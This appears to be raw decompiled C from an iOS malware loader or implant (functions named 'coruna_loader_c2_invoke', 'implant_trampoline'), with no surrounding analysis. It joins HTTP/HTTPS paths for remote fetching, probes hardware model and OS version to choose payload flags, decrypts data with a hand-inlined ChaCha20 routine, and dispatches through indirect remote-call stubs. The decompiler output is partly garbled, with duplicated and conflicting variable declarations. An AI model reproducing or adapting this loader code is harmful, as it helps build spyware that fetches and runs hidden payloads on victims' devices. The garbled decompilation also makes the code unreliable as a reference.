void coruna_join_path(long handle,int flags,int *count_2,uint size,char *path,unsigned long arg,
                 long *addr_2)
{
  size_t ls1;
  char err;
  int err;
  size_t ls4;
  char *ptr;
  char *buf;
  unsigned long u;
  uint64_t *ptr;
  char *str;
  char *copy;
  long handle;
  char *data;
  int *err;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t thread_attr;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t host_info;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t serial_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t action;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t block_ctx;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t stack_guard;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  uint64_t sa_saved;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t cache_27;
  uint64_t sa_new;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t cache_30;
  uint64_t path_buf;
  uint64_t cache_31;
  uint64_t cache_32;
  uint64_t cache_33;
  uint64_t tmp_buf;
  uint64_t cache_34;
  uint64_t cache_35;
  uint64_t cache_36;
  uint64_t region;
  uint64_t cache_37;
  uint64_t cache_38;
  uint64_t cache_39;
  uint64_t plist;
  uint64_t cache_40;
  uint64_t cache_41;
  uint64_t cache_42;
  uint64_t url_buf;
  uint64_t cache_43;
  uint64_t cache_44;
  uint64_t cache_45;
  uint64_t json_buf;
  uint64_t cache_46;
  uint64_t cache_47;
  uint64_t cache_48;
  
  if ((((((handle != 0) && (count_2 != (int *)0x0)) && (0x10b < size)) &&
       ((*count_2 == 0x12345678 && ((char)count_2[2] != '\0')))) &&
      ((*(char *)((long)count_2 + 0x107) == '\0' &&
       ((count_2[0x42] != 0 && (path != (char *)0x0)))))) &&
     ((arg != 0 && ((addr_2 != (long *)0x0 && (flags != 0)))))) {
    u = 0;
    err = count_2 + 0x43;
    do {
      if ((int *)((long)count_2 + (unsigned long)size) <= err) {
        return;
      }
      if (err + 0x19 < count_2) {
        return;
      }
      if ((int *)((long)count_2 + (unsigned long)size) < err + 0x19) {
        return;
      }
      if (*(char *)((long)err + 99) != '\0') {
        return;
      }
      if (*err == flags) {
        cache_46 = 0;
        json_buf = 0;
        cache_48 = 0;
        cache_47 = 0;
        cache_43 = 0;
        url_buf = 0;
        cache_45 = 0;
        cache_44 = 0;
        cache_40 = 0;
        plist = 0;
        cache_42 = 0;
        cache_41 = 0;
        cache_37 = 0;
        region = 0;
        cache_39 = 0;
        cache_38 = 0;
        cache_34 = 0;
        tmp_buf = 0;
        cache_36 = 0;
        cache_35 = 0;
        cache_31 = 0;
        path_buf = 0;
        cache_33 = 0;
        cache_32 = 0;
        cache_28 = 0;
        sa_new = 0;
        cache_30 = 0;
        cache_29 = 0;
        cache_25 = 0;
        sa_saved = 0;
        cache_27 = 0;
        cache_26 = 0;
        cache_22 = 0;
        stack_guard = 0;
        cache_24 = 0;
        cache_23 = 0;
        cache = 0;
        block_ctx = 0;
        cache_21 = 0;
        cache_20 = 0;
        json_buf = 0;
        action = 0;
        work = 0;
        frame = 0;
        region = 0;
        serial_buf = 0;
        url_buf = 0;
        plist = 0;
        sa_new = 0;
        host_info = 0;
        tmp_buf = 0;
        path_buf = 0;
        block_ctx = 0;
        thread_attr = 0;
        sa_saved = 0;
        stack_guard = 0;
        host_info = 0;
        bootargs = 0;
        action = 0;
        serial_buf = 0;
        scratch = 0;
        scratch = 0;
        thread_attr = 0;
        bootargs = 0;
        ls4 = _strlen((char *)(count_2 + 2));
        copy = "%s%s";
        if (*(char *)((long)count_2 + ls4 + 7) != '/') {
          copy = "%s/%s";
        }
        err = _snprintf((char *)&scratch,0x200,copy);
        if (0x1ff < err) {
          return;
        }
        err = (char)scratch;
        if ((char)scratch == '\0') {
          return;
        }
        err = (int)scratch;
        if ((err == 0x70747468 && scratch == 0x2f2f3a70) ||
           (scratch == 0x2f2f3a7370747468)) {
          _strlcpy(path,(char *)&scratch,arg);
          goto fail;
        }
        copy = *(char **)(handle + 0x80);
        if (copy == (char *)0x0) {
          return;
        }
        if (*copy == '\0') {
          return;
        }
        handle = 8;
        err = _strncmp(copy,"https://",8);
        if (err != 0) {
          handle = 7;
          err = _strncmp(copy,"http://",7);
          if (err != 0) {
            return;
          }
        }
        ptr = _strchr(copy + handle,0x2f);
        if (ptr == (char *)0x0) {
          ls4 = _strlen(copy);
          goto done;
        }
        data = ptr + 1;
        if (err != '/') goto cleanup;
        ptr = &scratch;
        ls4 = (long)(ptr + 1) - (long)copy;
        goto check_ok;
      }
      u = u + 1;
      err = err + 0x19;
    } while (u < (uint)count_2[0x42]);
  }
  return;
cleanup:
  do {
    str = data;
    buf = _strchr(str,0x2f);
    data = buf + 1;
  } while (buf != (char *)0x0);
  ls4 = (long)str - (long)copy;
done:
  ptr = &scratch;
  if (err == '.') {
    ptr = (uint64_t *)((unsigned long)&scratch | (unsigned long)(scratch == '/') << 1);
  }
check_ok:
  data = (char *)((long)ptr + -1);
  do {
    data = data + 1;
  } while (*data == '/');
  ls1 = arg;
  if (ls4 + 1 <= arg) {
    ls1 = ls4 + 1;
  }
  _strlcpy(path,copy,ls1);
  if (ptr == (char *)0x0) {
    _strlcat(path,"/",arg);
  }
  _strlcat(path,data,arg);
fail:
  *addr_2 = (long)(err + 1);
  return;
}
void coruna_loader_map_segments(long handle,long addr_2,uint64_t val,long off_3,long ctx_4,
                 long ctx_5)
{
  int err;
  uint u;
  unsigned long size;
  uint version;
  uint port;
  int status;
  
  if (handle == 0) {
    return;
  }
  if (addr_2 == 0) {
    return;
  }
  if ((int)val == 0) {
    return;
  }
  if (off_3 == 0) {
    return;
  }
  if (ctx_4 == 0) {
    return;
  }
  if (ctx_5 == 0) {
    return;
  }
  if ((*(char *)(handle + 0x5e8) == '\0') || (size = coruna_sysctl_hw_model(handle), (size & 1) != 0)) {
    version = 0;
    goto fail;
  }
  if (*(int *)(handle + 0xc0) - 0x100400U >> 10 < 0x3f) {
    err = *(int *)(handle + 0xe0);
    version = 0x30000;
    if (err < 0x1b588bb3) {
      if (err == -0x789a1216) goto fail;
      status = -0x25cc27c3;
    }
    else {
      if (err == 0x1b588bb3) goto fail;
      status = 0x462504d2;
    }
    if (err == status) goto fail;
  }
  version = 0x50000;
  if (0x400 < *(int *)(handle + 0xc0) - 0x100000U) {
    version = 0;
  }
fail:
  u = coruna_hw_model_probe(handle);
  if (u == 0) {
    port = 0;
  }
  else if ((*(byte *)(handle + 0xdb) & 1) == 0) {
    port = 0xf1000000;
  }
  else {
    port = 0xf3000000;
    if (*(uint *)(handle + 0xdc) < 2) {
      port = 0xf2000000;
    }
  }
  coruna_join_path(handle,u | version | port,addr_2,val,off_3,ctx_4,ctx_5);
  return;
}
void coruna_loader_run_setup(long handle,int flags,long addr_2,long off_3)
{
  uint32_t scratch;
  uint64_t bootargs[73];
  
  if ((handle != 0) &&
     (((*(long *)(handle + 0x110) != 0 && flags != 0) && addr_2 != 0) && off_3 != 0)) {
    bootargs[0] = 0;
    scratch = 0;
    coruna_loader_run(handle,flags,bootargs,&scratch);
    return;
  }
  return;
}
void coruna_hw_model_probe(long handle)
{
  if (handle != 0) {
    coruna_sysctl_hw_model();
  }
  return;
}
void coruna_loader_c2_invoke(long handle,char *path,uint64_t val,long addr_2,long off_3,
                 long ctx_4)
{
  uint32_t scratch;
  uint64_t bootargs;
  
  if (((handle != 0) && (*(long *)(handle + 0x40) != 0 && path != (char *)0x0)) &&
     (((*path != '\0' && addr_2 != 0) && off_3 != 0) && ctx_4 != 0)) {
    bootargs = 0;
    scratch = 0;
    coruna_loader_run(handle,path,&bootargs,&scratch);
    return;
  }
  return;
}
void coruna_chacha20(uint *out,long key,long nonce)
{
  uint u;
  uint size;
  uint version;
  uint port;
  uint tag;
  uint kind;
  uint type_id;
  uint64_t type_id_8;
  unsigned long type_id_9;
  uint type_id_10;
  bool err;
  uint type_id_11;
  unsigned long type_id_12;
  unsigned long type_id_13;
  uint type_id_14;
  long handle;
  byte status;
  int err;
  unsigned long type_id_15;
  uint type_id_16;
  uint type_id_17;
  uint type_id_18;
  uint type_id_19;
  uint type_id_20;
  long addr;
  unsigned long type_id_21;
  uint32_t scratch;
  uint scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  int stack_guard [9];
  uint64_t sa_saved;
  uint64_t host_info;
  
  type_id_9 = k_bootstrap_slot_0000bb88;
  type_id_8 = k_bootstrap_md5_init_state;
  if (((key != 0) && (nonce != 0)) && (out != (uint *)0x0)) {
    handle = 0;
    thread_attr = 0;
    host_info = 0;
    action = 0;
    serial_buf = 0;
    bootargs = 0;
    thread_attr = 0;
    bootargs = 0;
    stack_guard[1] = *out;
    stack_guard[6] = (int)*(uint64_t *)(out + 5);
    stack_guard[7] = (int)((unsigned long)*(uint64_t *)(out + 5) >> 0x20);
    block_ctx = k_bootstrap_md5_init_state;
    type_id_21 = *(unsigned long *)(out + 1);
    stack_guard[4] = (int)*(uint64_t *)(out + 3);
    stack_guard[5] = (int)((unsigned long)*(uint64_t *)(out + 3) >> 0x20);
    stack_guard[2] = (int)type_id_21;
    stack_guard[8] = out[7];
    sa_saved = 0;
    host_info = 0;
    type_id_15 = 0x40;
    do {
      if (type_id_15 < 0x40) {
        status = *(byte *)((long)&scratch + type_id_15);
      }
      else {
        scratch = (uint)type_id_8;
        scratch = (uint)((unsigned long)type_id_8 >> 0x20);
        type_id_15 = sa_saved & 0xffffffff;
        serial_buf = (uint)(sa_saved >> 0x20);
        type_id_10 = serial_buf;
        bootargs = (int)type_id_9;
        type_id_13 = type_id_9 & 0xffffffff;
        bootargs = (uint)(type_id_9 >> 0x20);
        action = 0;
        action = 0;
        err = 10;
        type_id_12 = type_id_21 >> 0x20;
        type_id_20 = stack_guard[1];
        type_id_16 = stack_guard[2];
        type_id_18 = stack_guard[5];
        type_id_19 = stack_guard[6];
        type_id_17 = stack_guard[7];
        type_id_14 = stack_guard[4];
        type_id_11 = stack_guard[8];
        do {
          u = (uint)type_id_15 ^ scratch + type_id_20;
          type_id_18 = (u >> 0x10 | u << 0x10) + type_id_18;
          size = type_id_18 ^ type_id_20;
          scratch = (size >> 0x14 | size << 0xc) + scratch + type_id_20;
          type_id_20 = scratch ^ (u >> 0x10 | u << 0x10);
          type_id_18 = (type_id_20 >> 0x18 | type_id_20 << 8) + type_id_18;
          size = type_id_18 ^ (size >> 0x14 | size << 0xc);
          serial_buf = serial_buf ^ scratch + type_id_16;
          type_id_19 = (serial_buf >> 0x10 | serial_buf << 0x10) + type_id_19;
          u = type_id_19 ^ type_id_16;
          scratch = (u >> 0x14 | u << 0xc) + scratch + type_id_16;
          version = scratch ^ (serial_buf >> 0x10 | serial_buf << 0x10);
          type_id_19 = (version >> 0x18 | version << 8) + type_id_19;
          type_id_16 = type_id_19 ^ (u >> 0x14 | u << 0xc);
          u = (int)type_id_13 + (uint)type_id_12;
          action = (uint)action ^ u;
          type_id_17 = ((uint)action >> 0x10 | (uint)action << 0x10) + type_id_17;
          port = type_id_17 ^ (uint)type_id_12;
          u = (port >> 0x14 | port << 0xc) + u;
          tag = u ^ ((uint)action >> 0x10 | (uint)action << 0x10);
          type_id_17 = (tag >> 0x18 | tag << 8) + type_id_17;
          port = type_id_17 ^ (port >> 0x14 | port << 0xc);
          action = action ^ bootargs + type_id_14;
          type_id_11 = (action >> 0x10 | action << 0x10) + type_id_11;
          kind = type_id_11 ^ type_id_14;
          bootargs = (kind >> 0x14 | kind << 0xc) + bootargs + type_id_14;
          type_id_14 = bootargs ^ (action >> 0x10 | action << 0x10);
          type_id_11 = (type_id_14 >> 0x18 | type_id_14 << 8) + type_id_11;
          kind = type_id_11 ^ (kind >> 0x14 | kind << 0xc);
          scratch = (type_id_16 >> 0x19 | type_id_16 << 7) + scratch;
          type_id_14 = scratch ^ (type_id_14 >> 0x18 | type_id_14 << 8);
          type_id_17 = (type_id_14 >> 0x10 | type_id_14 << 0x10) + type_id_17;
          type_id_16 = type_id_17 ^ (type_id_16 >> 0x19 | type_id_16 << 7);
          scratch = (type_id_16 >> 0x14 | type_id_16 << 0xc) + scratch;
          type_id_14 = scratch ^ (type_id_14 >> 0x10 | type_id_14 << 0x10);
          action = type_id_14 >> 0x18 | type_id_14 << 8;
          type_id_17 = action + type_id_17;
          type_id_16 = type_id_17 ^ (type_id_16 >> 0x14 | type_id_16 << 0xc);
          type_id_16 = type_id_16 >> 0x19 | type_id_16 << 7;
          scratch = (port >> 0x19 | port << 7) + scratch;
          type_id_14 = scratch ^ (type_id_20 >> 0x18 | type_id_20 << 8);
          type_id_11 = (type_id_14 >> 0x10 | type_id_14 << 0x10) + type_id_11;
          type_id_20 = type_id_11 ^ (port >> 0x19 | port << 7);
          scratch = (type_id_20 >> 0x14 | type_id_20 << 0xc) + scratch;
          type_id_14 = scratch ^ (type_id_14 >> 0x10 | type_id_14 << 0x10);
          port = type_id_14 >> 0x18 | type_id_14 << 8;
          type_id_15 = (unsigned long)port;
          type_id_11 = port + type_id_11;
          type_id_14 = type_id_11 ^ (type_id_20 >> 0x14 | type_id_20 << 0xc);
          type_id = type_id_14 >> 0x19 | type_id_14 << 7;
          type_id_12 = (unsigned long)type_id;
          u = (kind >> 0x19 | kind << 7) + u;
          type_id_14 = u ^ (version >> 0x18 | version << 8);
          type_id_18 = (type_id_14 >> 0x10 | type_id_14 << 0x10) + type_id_18;
          type_id_20 = type_id_18 ^ (kind >> 0x19 | kind << 7);
          u = (type_id_20 >> 0x14 | type_id_20 << 0xc) + u;
          type_id_13 = (unsigned long)u;
          type_id_14 = u ^ (type_id_14 >> 0x10 | type_id_14 << 0x10);
          serial_buf = type_id_14 >> 0x18 | type_id_14 << 8;
          type_id_18 = serial_buf + type_id_18;
          type_id_14 = type_id_18 ^ (type_id_20 >> 0x14 | type_id_20 << 0xc);
          type_id_14 = type_id_14 >> 0x19 | type_id_14 << 7;
          bootargs = bootargs + (size >> 0x19 | size << 7);
          type_id_20 = bootargs ^ (tag >> 0x18 | tag << 8);
          type_id_19 = (type_id_20 >> 0x10 | type_id_20 << 0x10) + type_id_19;
          size = type_id_19 ^ (size >> 0x19 | size << 7);
          bootargs = (size >> 0x14 | size << 0xc) + bootargs;
          type_id_20 = bootargs ^ (type_id_20 >> 0x10 | type_id_20 << 0x10);
          action = type_id_20 >> 0x18 | type_id_20 << 8;
          type_id_19 = (uint)action + type_id_19;
          type_id_20 = type_id_19 ^ (size >> 0x14 | size << 0xc);
          type_id_20 = type_id_20 >> 0x19 | type_id_20 << 7;
          err = err + -1;
        } while (err != 0);
        addr = 0;
        bootargs = coruna_u64_pack((type_id_16), (type_id_20));
        serial_buf = coruna_u64_pack((serial_buf), (port));
        host_info = coruna_u64_pack((type_id_19), (type_id_18));
        thread_attr = coruna_u64_pack((type_id_14), (type_id));
        thread_attr = coruna_u64_pack((type_id_11), (type_id_17));
        status = (char)type_id_8 + (char)scratch;
        bootargs = coruna_u64_pack((uint32_t)bootargs, (uint32_t)((int)bootargs + u));
        do {
          *(int *)((long)&bootargs + addr + 4) =
               *(int *)((long)stack_guard + addr) + *(int *)((long)&bootargs + addr + 4);
          addr = addr + 4;
        } while (addr != 0x34);
        err = (int)sa_saved == -1;
        sa_saved = coruna_u64_pack((type_id_10), (uint32_t)((int)sa_saved + 1));
        type_id_15 = 0;
        if (err) {
          sa_saved = (unsigned long)(type_id_10 + 1) << 0x20;
        }
      }
      *(byte *)(key + handle) = *(byte *)(key + handle) ^ status;
      type_id_15 = type_id_15 + 1;
      handle = handle + 1;
    } while (handle != nonce);
  }
  return;
}





void coruna_loader_run_alt(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
                 uint64_t off_5)
{
  coruna_implant_trampoline_fn indirect_target;
  
  if (k_bootstrap_remote_dispatch != 0) {
    coruna_nop_0();
    coruna_svc_indirect_6(val,id_2,size_3,off_4,off_5);
    return;
  }
  (*indirect_target)();
  return;
}





void coruna_loader_run(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
                 uint64_t off_5)
{
  coruna_implant_trampoline_fn indirect_target;
  
  if (k_bootstrap_remote_dispatch != 0) {
    coruna_nop_0();
    coruna_svc_indirect_6(val,id_2,size_3,off_4,off_5);
    return;
  }
  (*indirect_target)();
  return;
}
void coruna_nop_0(void)
{
  return;
}
void coruna_nop_1(void)
{
  return;
}
void coruna_nop_2(void)
{
  return;
}
void coruna_nop_3(void)
{
  return;
}





void coruna_svc_indirect_5(uint64_t val,uint64_t id_2)
{
  (*k_bootstrap_remote_dispatch)(0xb389,val,id_2,k_bootstrap_remote_arg_a);
  return;
}





void coruna_svc_indirect_6(uint64_t val,uint64_t id_2)
{
  (*k_bootstrap_remote_dispatch)(0xb389,val,id_2,k_bootstrap_remote_arg_b);
  return;
}





void coruna_sel_beginbackgroundtask(uint64_t val)
{
  (*(void (*)k_bootstrap_objc_msgsend_slot)(val,PTR_s_beginBackgroundTaskWithExpiratio_000102d8);
  return;
}





void coruna_sel_endbackgroundtask(uint64_t val)
{
  (*(void (*)k_bootstrap_objc_msgsend_slot)(val,PTR_s_endBackgroundTask__000102e0);
  return;
}

